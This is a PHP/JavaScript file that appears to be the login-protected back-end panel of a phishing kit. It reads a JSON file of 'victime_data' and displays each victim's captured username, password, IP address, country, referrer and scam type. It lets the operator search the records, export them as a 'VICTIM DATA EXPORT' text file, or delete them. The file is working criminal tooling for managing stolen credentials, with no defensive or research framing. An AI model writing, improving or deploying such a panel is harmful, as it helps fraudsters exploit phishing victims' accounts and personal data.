<?php
session_start();

$authenticated = false;
$jsonData = null;
$fileName = '';
$fileSize = 0;
$errorMessage = '';
$successMessage = '';

// Handle password form submission
if ($_POST && isset($_POST['password'])) {
    $password = $_POST['password'];
    $correctPassword = 'king123'; // Sample password
    
    if ($password === $correctPassword) {
        $_SESSION['authenticated'] = true;
        $authenticated = true;
    } else {
        $errorMessage = 'Incorrect password. Please try again.';
    }
}

// Check if user is already authenticated
if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
    $authenticated = true;
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}



// Load JSON data if authenticated
if ($authenticated) {
    function findJsonFile() {
        $currentDir = __DIR__;
        $files = scandir($currentDir);
        
        foreach ($files as $file) {
            if (pathinfo($file, PATHINFO_EXTENSION) === 'json') {
                return $file;
            }
        }
        
        return null;
    }
    
    function readJsonFile($filename) {
        $filepath = __DIR__ . '/' . $filename;
        
        if (!file_exists($filepath)) {
            return null;
        }
        
        $content = file_get_contents($filepath);
        if ($content === false) {
            return null;
        }
        
        $data = json_decode($content, true);
        if (json_last_error() !== JSON_ERROR_NONE) {
            return null;
        }
        
        return [
            'data' => $data,
            'filesize' => filesize($filepath)
        ];
    }
    
    try {
        $jsonFile = findJsonFile();
        
        if ($jsonFile) {
            $result = readJsonFile($jsonFile);
            
            if ($result) {
                $fileName = $jsonFile;
                $fileSize = $result['filesize'];
                $jsonData = $result['data'];
            } else {
                $errorMessage = 'Error reading or parsing JSON file: ' . $jsonFile;
            }
        } else {
            $errorMessage = 'No JSON file found in the current directory.';
        }
    } catch (Exception $e) {
        $errorMessage = 'Server error: ' . $e->getMessage();
    }
}


// Handle clear data action
if (isset($_POST['clear_data']) && $authenticated) {
    $jsonFile = findJsonFile();
    if ($jsonFile) {
        $filepath = __DIR__ . '/' . $jsonFile;
        if (file_exists($filepath) && unlink($filepath)) {
            $successMessage = 'Data file has been deleted successfully.';
        } else {
            $errorMessage = 'Failed to delete the data file.';
        }
    } else {
        $errorMessage = 'Data file not found.';
    }
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JSON Data Viewer</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <?php if (!$authenticated): ?>
        <!-- Login Form -->
        <div id="loginForm" class="login-container">
            <div class="login-card">
                <h1>Access Required</h1>
                <p>Please enter the password to view the data</p>
                <form method="POST" action="">
                    <div class="input-group">
                        <input type="password" name="password" id="password" placeholder="Enter password" required>
                        <button type="submit">Access</button>
                    </div>
                    <?php if ($errorMessage): ?>
                    <div class="error-message show"><?php echo htmlspecialchars($errorMessage); ?></div>
                    <?php endif; ?>
                </form>
            </div>
        </div>
        <?php else: ?>
        <!-- Data Display -->
        <div id="dataDisplay" class="data-container">
            <header class="header">
                <h1>Data Viewer</h1>
                <a href="?logout=1" class="logout-btn">Logout</a>
            </header>
            
            <div class="content">
                <?php if ($successMessage): ?>
                <div class="success-message"><?php echo htmlspecialchars($successMessage); ?></div>
                <?php endif; ?>
                <?php if ($errorMessage): ?>
                <div class="error-message show"><?php echo htmlspecialchars($errorMessage); ?></div>
                <?php endif; ?>
                
               
                
                <!-- Search and Action Controls -->
                <div class="controls">
                    <div class="search-filters">
                        <div class="search-group">
                            <input type="text" id="searchInput" placeholder="Search user, password, scam, or country..." class="search-input">
                        </div>
                        <div class="action-group">
                             <button id="refreshBtn" class="action-btn download-btn">Refresh</button>
                            <button id="downloadBtn" class="action-btn download-btn">Download Data</button>
                            <form method="POST" style="display: inline;" onsubmit="return confirm('Are you sure you want to clear all data? This action cannot be undone.');">
                                <button type="submit" name="clear_data" class="action-btn clear-btn">Clear All Data</button>
                            </form>
                            <button id="clearFilters" class="action-btn filter-btn">Clear Search</button>
                        </div>
                    </div>
                </div>
                
                <div class="data-content">
                    <?php if ($errorMessage && !$successMessage): ?>
                    <div class="error-card"><?php echo htmlspecialchars($errorMessage); ?></div>
                    <?php else: ?>
                    <div id="cardsContainer" class="cards-container"></div>
                    <div id="noResults" class="no-results" style="display: none;">
                        <p>No records found matching your search criteria.</p>
                    </div>
                    <?php endif; ?>
                </div>
            </div>
        </div>
        <?php endif; ?>
    </div>

    <script>
        // Embed JSON data directly in JavaScript
        const jsonData = <?php echo $jsonData ? json_encode($jsonData) : 'null'; ?>;

            const refreshBtn = document.getElementById('refreshBtn');
            refreshBtn.addEventListener('click', () => window.location.reload());

        document.addEventListener('DOMContentLoaded', function() {
            <?php if ($authenticated && $jsonData): ?>
            const searchInput = document.getElementById('searchInput');
            const clearFilters = document.getElementById('clearFilters');
            const downloadBtn = document.getElementById('downloadBtn');
            
            let allData = [];
            let filteredData = [];
            
            // Initialize data
            if (jsonData && jsonData.victime_data) {
                allData = jsonData.victime_data;
            } else if (Array.isArray(jsonData)) {
                allData = jsonData;
            }
            
            filteredData = [...allData];
            
            // Search and action event listeners
            searchInput.addEventListener('input', debounce(filterData, 300));
            clearFilters.addEventListener('click', clearAllFilters);
            downloadBtn.addEventListener('click', downloadData);
            
            // Initial render
            renderCards();
            
            function filterData() {
                const searchTerm = searchInput.value.toLowerCase().trim();
                
                filteredData = allData.filter(item => {
                    // Search in user, password, scam, and country
                    const searchMatch = !searchTerm || 
                        (item.victime_user && item.victime_user.toLowerCase().includes(searchTerm)) ||
                        (item.victime_password && item.victime_password.toLowerCase().includes(searchTerm)) ||
                        (item.victime_scama && item.victime_scama.toLowerCase().includes(searchTerm)) ||
                        (item.country && item.country.toLowerCase().includes(searchTerm));
                    
                    return searchMatch;
                });
                
                document.getElementById('recordCount').textContent = `${filteredData.length} of ${allData.length} records`;
                renderCards();
            }
            
            function downloadData() {
                let content = "VICTIM DATA EXPORT\n";
                content += "==================\n";
                content += `Export Date: ${new Date().toLocaleString()}\n`;
                content += `Total Records: ${allData.length}\n\n`;
                
                allData.forEach((item, index) => {
                    content += `RECORD #${index + 1}\n`;
                    content += `${'-'.repeat(40)}\n`;
                    content += `User: ${decodeHtmlEntities(item.victime_user || 'N/A')}\n`;
                    content += `Password: ${decodeHtmlEntities(item.victime_password || 'N/A')}\n`;
                    content += `IP Address: ${item.victime_ip || 'N/A'}\n`;
                    content += `Country: ${item.country || 'N/A'}\n`;
                    content += `Scam: ${item.victime_scama || 'N/A'}\n`;
                    content += `Referrer: ${item.vic_reff || 'N/A'}\n`;
                    content += `User Agent: ${item.user_agent || 'N/A'}\n`;
                    content += `Timestamp: ${item.timestamp || new Date(item.victime_date * 1000).toLocaleString()}\n\n`;
                });
                
                const blob = new Blob([content], { type: 'text/plain' });
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `victim_data_${new Date().toISOString().split('T')[0]}.txt`;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                window.URL.revokeObjectURL(url);
            }
            
            function renderCards() {
                const container = document.getElementById('cardsContainer');
                const noResults = document.getElementById('noResults');
                
                if (filteredData.length === 0) {
                    container.innerHTML = '';
                    noResults.style.display = 'block';
                    return;
                }
                
                noResults.style.display = 'none';
                
                container.innerHTML = filteredData.map(item => createCardHTML(item)).join('');
            }
            
            function createCardHTML(item) {
                const timestamp = item.timestamp || new Date(item.victime_date * 1000).toLocaleString();
                const decodedUser = decodeHtmlEntities(item.victime_user || 'N/A');
                const decodedPassword = decodeHtmlEntities(item.victime_password || 'N/A');
                
                return `
                    <div class="victim-card">
                        <div class="card-header">
                            <div class="card-title">${decodedUser}</div>
                            <div class="country-badge">${item.country || 'N/A'}</div>
                        </div>
                        
                        <div class="card-field">
                            <span class="field-label">Password</span>
                            <span class="field-value password">${decodedPassword}</span>
                        </div>
                        
                        <div class="card-field">
                            <span class="field-label">Scam</span>
                            <span class="field-value scam">${item.victime_scama || 'N/A'}</span>
                        </div>
                        
                        <div class="card-field">
                            <span class="field-label">IP Address</span>
                            <span class="field-value ip">${item.victime_ip || 'N/A'}</span>
                        </div>
                        
                        <div class="card-field">
                            <span class="field-label">Referrer</span>
                            <span class="field-value">${item.vic_reff ? item.vic_reff.substring(0, 30) + '...' : 'N/A'}</span>
                        </div>
                        
                        <div class="card-field">
                            <span class="field-label">Time</span>
                            <span class="field-value timestamp">${timestamp}</span>
                        </div>
                    </div>
                `;
            }
            
            function clearAllFilters() {
                searchInput.value = '';
                filteredData = [...allData];
                document.getElementById('recordCount').textContent = `${allData.length} records`;
                renderCards();
            }
            
            function decodeHtmlEntities(text) {
                const textarea = document.createElement('textarea');
                textarea.innerHTML = text;
                return textarea.value;
            }
            
            function debounce(func, wait) {
                let timeout;
                return function executedFunction(...args) {
                    const later = () => {
                        clearTimeout(timeout);
                        func(...args);
                    };
                    clearTimeout(timeout);
                    timeout = setTimeout(later, wait);
                };
            }
            <?php endif; ?>
        });
    </script>
</body>
</html>
<?php
function formatFileSize($bytes) {
    if ($bytes === 0) return '0 Bytes';
    $k = 1024;
    $sizes = ['Bytes', 'KB', 'MB', 'GB'];
    $i = floor(log($bytes) / log($k));
    return round(($bytes / pow($k, $i)), 2) . ' ' . $sizes[$i];
}
?>